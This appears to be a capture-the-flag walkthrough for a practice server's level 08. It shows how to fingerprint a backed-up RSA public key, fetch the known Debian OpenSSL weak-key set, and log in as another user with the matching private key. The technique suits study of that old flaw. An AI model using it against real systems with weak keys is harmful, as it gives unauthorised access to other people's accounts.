## Level 08 - SSH... Z is sleeping

- SSH into the server.
 ```bash
ssh yourusername@warchall.net -p 19198
```

- Navigate to the level 08 directory.
```bash
cd /home/level/08_sshz
```
- List all files
```bash
ls -al #We can see that all the files belong to level08
```
- The authorized_keys.backup file contains a 2048-bit RSA key. Use the following commands to check the fingerprints:
```bash
ssh-keygen -lf /home/level/08_sshz/backups/authorized_keys.backup  # SHA256
ssh-keygen -l -E md5 -f /home/level/08_sshz/backups/authorized_keys.backup  # MD5
```
- Download the Debian SSH RSA 2048 x86 tar file from [this link](http://digitaloffense.net/tools/debian-openssl/).
- On Windows, open PowerShell as an administrator
- Use SCP to copy the private key to the server:
```bash
scp -P 19198 /path/to/2bcd07a701e94a0474d77ee4d6d0f806-23669 user@warchall.net:~/
```
- Set the appropriate private key permissions on the server:
```bash
chmod 600 ~/2bcd07a701e94a0474d77ee4d6d0f806-23669
```
- SSH into the server as level08 using the private key:
```bash
ssh -i ~/2bcd07a701e94a0474d77ee4d6d0f806-23669 level08@warchall.net -p 19198
```
